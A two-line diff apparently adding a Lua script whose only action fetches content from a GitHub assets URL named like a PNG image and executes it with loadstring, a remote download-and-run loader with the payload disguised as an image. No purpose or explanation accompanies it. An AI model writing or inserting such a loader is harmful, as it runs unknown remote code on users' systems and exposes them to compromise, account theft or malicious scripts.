@@ -1,0 +1,2 @@
+fileType="Lua"
+loadstring(httpGet("https://github.com/xyzkyle/Flarex/assets/lg.png",true))()
